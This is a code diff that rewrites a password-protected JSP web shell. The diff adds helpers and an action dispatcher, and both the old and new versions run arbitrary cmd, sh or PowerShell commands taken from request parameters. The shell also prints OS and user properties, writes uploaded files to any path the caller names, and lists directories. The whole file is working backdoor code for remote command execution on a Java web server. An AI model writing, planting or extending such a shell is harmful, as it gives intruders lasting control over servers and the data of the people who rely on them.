@@ -1,18 +1,152 @@
-<%@page import="java.io.BufferedReader,
-                java.io.IOException,
-                java.io.InputStreamReader,
-                java.io.IOException,
-                java.io.File,
-                java.io.FileOutputStream,
-                java.io.OutputStream,
-                java.io.ByteArrayOutputStream,
-                javax.servlet.ServletInputStream,
-                java.util.Hashtable,
-                java.util.StringTokenizer"
-%>
+<%@ page import="java.io.*" %>
+<%@ page import="java.util.Properties" %>
+<%@ page import="java.util.Hashtable" %>
+<%@ page import="java.util.StringTokenizer" %>
 
 <%!
+    static boolean isNotEmpty(Object obj) {
+        if (obj == null) {
+            return false;
+        }
+        return !"".equals(String.valueOf(obj).trim());
+    }
 
+    static String formatMessage(String message) {
+        return "[*]\t" + message;
+    }
+
+    static String exceptionToString(Exception e) {
+        StringWriter sw = new StringWriter();
+        e.printStackTrace(new PrintWriter(sw, true));
+        return sw.toString();
+    }
+
+    static ByteArrayOutputStream inutStreamToOutputStream(InputStream in) throws IOException {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        byte[] b = new byte[1024];
+        int a = 0;
+        while((a = in.read(b))!=-1){
+            baos.write(b,0,a);
+        }
+        return baos;
+    }
+
+    static String findRealPath(String path) {
+        String filePath = null;
+        if (isNotEmpty(path)) {
+            File f = new File(path).getParentFile();
+            //This is a hack needed for tomcat
+            while (isNotEmpty(f) && !f.exists())
+                f = f.getParentFile();
+            if (isNotEmpty(f))
+                filePath = f.getAbsolutePath();
+        }
+        if (filePath == null) {
+            filePath = new File(".").getAbsolutePath();
+        }
+        return filePath;
+    }
+
+    public enum Attributes {
+
+        OS_VERSION("os.version"),
+        OS_NAME("os.name"),
+        OS_ARCH("os.arch"),
+        JAVA_HOME("java.home"),
+        JAVA_VENDOR("java.vendor"),
+        JAVA_VERSION("java.version"),
+        USER_DIR("user.dir"),
+        USER_HOME("user.home"),
+        USER_NAME("user.name");
+
+        private String value = null;
+
+        Attributes(String s) {
+            this.value = s;
+        }
+
+        public String value() {
+            return value;
+        }
+    }
+
+    public static class Command {
+        public static final String WIN_CMD[] = {"cmd", "/C"};
+        public static final String WIN_POWER[] = {"cmd", "/C", "powershell", "-nologo", "-Command"};
+        public static final String BASH[]    = {"/bin/sh", "-c"};
+        private static final String IPCONFIG = "ipconfig /all";
+        private static final String IFCONFIG = "/sbin/ifconfig -a";
+        private static final String END_OF_POWER_SHELL_COMMAND = "---end-of-script---";
+        public static final String WDIR_LIST = "dir";
+        public static final String LDIR_LIST = "ls -la";
+
+        public static String getOS() {
+            return System.getProperty(Attributes.OS_NAME.value()).toLowerCase();
+        }
+
+        public static String ipconfig() {
+            String command = (getOS().startsWith("windows")) ? IPCONFIG : IFCONFIG;
+            return runCommand(command);
+        }
+
+        public static String runCommand(String command) {
+            String os = System.getProperty(Attributes.OS_NAME.value()).toLowerCase();
+
+            String shell[] = (os.startsWith("windows")) ? WIN_CMD : BASH;
+
+            return runCommand(shell, command);
+        }
+
+        public static String runPowerCommand(String command) {
+            String os = System.getProperty(Attributes.OS_NAME.value()).toLowerCase();
+
+            String shell[] = (os.startsWith("windows")) ? WIN_POWER : BASH;
+            String cmd = "\"& { "+command+";echo  \"---end-of-script---\"; }\"";
+            return runCommand(shell, cmd);
+        }
+
+        public static String listDir(String path) {
+            String command = (getOS().startsWith("windows")) ? WDIR_LIST : LDIR_LIST;
+            command += " " + path;
+            return runCommand(command);
+        }
+
+        public static String runCommand(String shell[], String command) {
+            String cmd[] = new String[shell.length + 1];
+            System.arraycopy(shell, 0, cmd, 0, shell.length);
+            cmd[cmd.length - 1] = command;
+
+            BufferedReader bufferedReader = null;
+            InputStreamReader inputStreamReader = null;
+            StringBuffer stringBuffer = null;
+
+            try {
+                Process process   = Runtime.getRuntime().exec(cmd);
+                inputStreamReader = new InputStreamReader(process.getInputStream());
+                bufferedReader    = new BufferedReader(inputStreamReader);
+                stringBuffer      = new StringBuffer();
+                String line;
+
+                while ((line = bufferedReader.readLine()) != null && !line.equals("---end-of-script---")) {
+                    if (line.length() > 0) {
+                        stringBuffer.append(line);
+                        stringBuffer.append('\n');
+                    }
+                }
+            } catch (IOException ex) {
+                return exceptionToString(ex);
+            } finally {
+
+                try {
+                    inputStreamReader.close();
+                    bufferedReader.close();
+                } catch (IOException e) {
+                    return exceptionToString(e);
+                }
+            }
+            return stringBuffer.toString();
+        }
+    }
     public class Upload {
         private final int ONE_MB=1024*1024*1;
 
@@ -368,158 +502,59 @@
             this.sb = sb;
         }
     }
-
-    public enum Attributes {
-
-        OS_VERSION("os.version"),
-        OS_NAME("os.name"),
-        OS_ARCH("os.arch"),
-        JAVA_HOME("java.home"),
-        JAVA_VENDOR("java.vendor"),
-        JAVA_VERSION("java.version"),
-        USER_DIR("user.dir"),
-        USER_HOME("user.home"),
-        USER_NAME("user.name");
-
-        private String value = null;
-
-        Attributes(String s) {
-            this.value = s;
-        }
-
-        public String value() {
-            return value;
-        }
-    }
-
-    public static class Command {
-        public static final String WIN_CMD[] = {"cmd", "/C"};
-        public static final String WIN_POWER[] = {"cmd", "/C", "powershell", "-nologo", "-Command"};
-        public static final String BASH[]    = {"/bin/sh", "-c"};
-        private static final String IPCONFIG = "ipconfig /all";
-        private static final String IFCONFIG = "/sbin/ifconfig -a";
-        private static final String END_OF_POWER_SHELL_COMMAND = "---end-of-script---";
-        public static final String WDIR_LIST = "dir";
-        public static final String LDIR_LIST = "ls -la";
-
-        public static String getOS() {
-            return System.getProperty(Attributes.OS_NAME.value()).toLowerCase();
-        }
-
-        public static String ipconfig() {
-            String command = (getOS().startsWith("windows")) ? IPCONFIG : IFCONFIG;
-            return runCommand(command);
-        }
-
-        public static String runCommand(String command) {
-            String os = System.getProperty(Attributes.OS_NAME.value()).toLowerCase();
-
-            String shell[] = (os.startsWith("windows")) ? WIN_CMD : BASH;
-
-            return runCommand(shell, command);
-        }
-
-        public static String runPowerCommand(String command) {
-            String os = System.getProperty(Attributes.OS_NAME.value()).toLowerCase();
-
-            String shell[] = (os.startsWith("windows")) ? WIN_POWER : BASH;
-            String cmd = "\"& { "+command+";echo  \"---end-of-script---\"; }\"";
-            return runCommand(shell, cmd);
-        }
-
-        public static String listDir(String path) {
-            String command = (getOS().startsWith("windows")) ? WDIR_LIST : LDIR_LIST;
-            command += " " + path;
-            return runCommand(command);
-        }
-
-        public static String runCommand(String shell[], String command) {
-            String cmd[] = new String[shell.length + 1];
-            System.arraycopy(shell, 0, cmd, 0, shell.length);
-            cmd[cmd.length - 1] = command;
-
-            BufferedReader bufferedReader = null;
-            InputStreamReader inputStreamReader = null;
-            StringBuffer stringBuffer = null;
-
-            try {
-                Process process   = Runtime.getRuntime().exec(cmd);
-                inputStreamReader = new InputStreamReader(process.getInputStream());
-                bufferedReader    = new BufferedReader(inputStreamReader);
-                stringBuffer      = new StringBuffer();
-                String line;
-
-                while ((line = bufferedReader.readLine()) != null && !line.equals("---end-of-script---")) {
-                    if (line.length() > 0) {
-                        stringBuffer.append(line);
-                        stringBuffer.append('\n');
-                    }
-                }
-            } catch (IOException ex) {
-            } finally {
-
-                try {
-                    inputStreamReader.close();
-                    bufferedReader.close();
-                } catch (IOException e) {}
-            }
-            return stringBuffer.toString();
-        }
-    }
 %>
 
-
 <%
-if(request.getParameter("pass")!= null &&
-    request.getParameter("pass").equals(application.getInitParameter("pass")))
-{
-    String method = request.getMethod();
+    String actions[] = {"exec", "up", "down", "power"};
+    String reqPass = request.getParameter("pass");
+    String reqMethod = request.getMethod();
+    String reqContentType = request.getContentType();
+    String reqPath = request.getParameter("path");
+    String reqAction  = request.getParameter("action");
+    String reqArgs  = request.getParameter("args");
 
-    if ("POST".equalsIgnoreCase(method))
-    {
-        String contentType = request.getContentType().toLowerCase();
+    Command command = new Command();
 
-        if(contentType != null && contentType.startsWith("multipart"))
-        {
-            String filePath = null;
-            String boundary;
-            int bStart = 0;
+    if (isNotEmpty(reqPass) && reqPass.equals(application.getInitParameter("pass"))) {
+        String path = application.getRealPath(request.getRequestURI());
+        String realPath = findRealPath(path);
+        request.setAttribute("path" , realPath);
+        if (isNotEmpty(reqMethod) && "GET".equalsIgnoreCase(reqMethod)) {
+            if (isNotEmpty(reqAction) && reqAction.equals(actions[0]) && isNotEmpty(reqArgs)) {
+                out.println(formatMessage(command.runCommand(reqArgs)));
+            } else if (isNotEmpty(reqAction) && reqAction.equals(actions[2])) {
 
-            if (request.getParameter("filePath") != null)
-            {
-                filePath = request.getParameter("filePath");
+            } else if (isNotEmpty(reqAction) && reqAction.equals(actions[3])) {
+                out.println(formatMessage(command.runPowerCommand(reqArgs)));
             } else {
-                String realPath = application.getRealPath(request.getRequestURI());
-                if (realPath != null) {
-                    File f = new File(realPath).getParentFile();
-                    //This is a hack needed for tomcat
-                    while (f != null && !f.exists())
-                        f = f.getParentFile();
-                    if (f != null)
-                        filePath = f.getAbsolutePath();
-                }
-                if (filePath == null) {
-                    filePath = new File(".").getAbsolutePath();
+                Properties props = System.getProperties();
+                Attributes attributes[] = Attributes.values();
+                int attributesSize = attributes.length;
+                for (int i=0; i < attributesSize; i++) {
+                    String attributeName = attributes[i].name();
+                    String attributeValue = attributes[i].value();
+                    out.println(formatMessage(attributeName+": "+props.getProperty(attributeValue)));
                 }
             }
-            bStart          = contentType.lastIndexOf("oundary=");
-            boundary        = contentType.substring(bStart + 8);
-            Upload fileUpload = new Upload();
-            Hashtable hashtable = fileUpload.parseData(request.getInputStream(), boundary, filePath);
-            out.println("File uploaded to: "+ filePath);
-            out.println(Command.listDir(filePath));
+        } else if (isNotEmpty(reqMethod) && "POST".equalsIgnoreCase(reqMethod)) {
+            if(isNotEmpty(reqContentType) && reqContentType.startsWith("multipart")) {
+                String destPath = null;
+                String boundary;
+                int bStart = 0;
+                bStart          = reqContentType.lastIndexOf("oundary=");
+                boundary        = reqContentType.substring(bStart + 8);
+                Upload fileUpload = new Upload();
+
+                if (!isNotEmpty(reqPath) && isNotEmpty(realPath)) {
+                    destPath = realPath;
+                } else if (isNotEmpty(reqPath)) {
+                    destPath = reqPath;
+                }
+                Hashtable hashtable = fileUpload.parseData(request.getInputStream(), boundary, destPath);
+                out.println("File uploaded to: "+ destPath);
+                out.println(Command.listDir(destPath));
+            }
         }
     }
-    else if ("GET".equalsIgnoreCase(method))
-    {
-        String cmd = request.getParameter("cmd");
-        String power = request.getParameter("power");
-        if ((cmd != null) && ((power != null) && (power.toLowerCase().equals("true"))))
-        {
-            out.print(Command.runPowerCommand(cmd));
-        } else if (cmd != null) {
-            out.print(Command.runCommand(cmd));
-        }
-    }
-}
+
 %>
